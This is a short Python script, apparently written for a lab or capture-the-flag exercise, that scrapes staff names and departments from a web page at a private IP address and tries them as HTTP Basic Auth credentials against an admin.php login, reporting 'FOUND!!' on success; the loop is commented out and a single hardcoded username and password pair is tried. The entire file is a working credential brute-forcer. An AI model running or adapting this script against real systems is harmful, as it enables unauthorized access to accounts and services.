import sys
import base64
from bs4 import BeautifulSoup
import requests
from requests.auth import HTTPBasicAuth


def findNames(table):
    table=soup.find_all("table")
    table_names=soup.find_all("td",id='name')
    user_names=[]
    for name in table_names:
        user_names.append(name.text)
    return user_names

def findDepts(table):
    passwords=[]
    table_passes = soup.find_all('td',id="department")
    for paswds in table_passes:
        passwords.append(paswds.text)
    return passwords


def signIn(url,username,passwd):
    r= requests.get(url,auth=HTTPBasicAuth(username,passwd))
    print(f"Username:{username},Password:{passwd}")
    if r.status_code==401:
        print("Rejected!")
    else:
        print(r.status_code)
        print(f"{username}:{passwd}")
        print("FOUND!!")
        print(r.request.body)
        sys.exit()

url='http://172.16.120.120/'
print("Scraping Data..")
html_content=requests.get(url).text
soup=BeautifulSoup(html_content,"lxml") #parser

names=findNames(soup)
sortednames=sorted(set(names))
depts=findDepts(soup)
sorteddepts=sorted(set(depts))

print(f"Names:{sortednames}")
print(f"Depts:{sorteddepts}")

print("\n!!Running BruteForecer!!\n")


# for name in sortednames:
#     for dept in sorteddepts:
#         signIn("http://172.16.120.120/admin.php",name,dept)
signIn('http://172.16.120.120/admin.php','Zack','Management')



